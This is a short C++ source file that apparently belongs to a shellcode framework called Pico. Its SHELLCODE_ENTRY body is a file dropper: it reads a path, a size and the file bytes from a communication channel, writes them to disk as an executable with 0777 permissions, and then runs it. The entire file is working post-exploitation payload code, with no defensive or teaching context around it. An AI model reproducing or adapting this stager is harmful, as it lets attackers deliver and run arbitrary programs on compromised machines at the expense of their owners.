#include <factory.h>
#include <pico.h>

using namespace Pico;
using namespace Pico::Filesystem;

SHELLCODE_ENTRY
{
    auto channel = Options::channel();
    unsigned int file_sz;
    char file_path[256];

    /* Read the path. */
    channel.read(file_path, sizeof(file_path));

    /* Read the file size. */
    channel.read(&file_sz, sizeof(file_sz));
    
    /* Read the file data. */
    Memory::Buffer file_contents(file_sz, Memory::READ | Memory::WRITE);
    channel.read(file_contents.pointer(), file_sz);

    /* Drop executable file. */
    File::create(file_path, File::TRUNCATE | File::WRITE, 0777).write(file_contents);

    /* Execute the dropped executable. */
    Process::execute(channel, file_path);
}
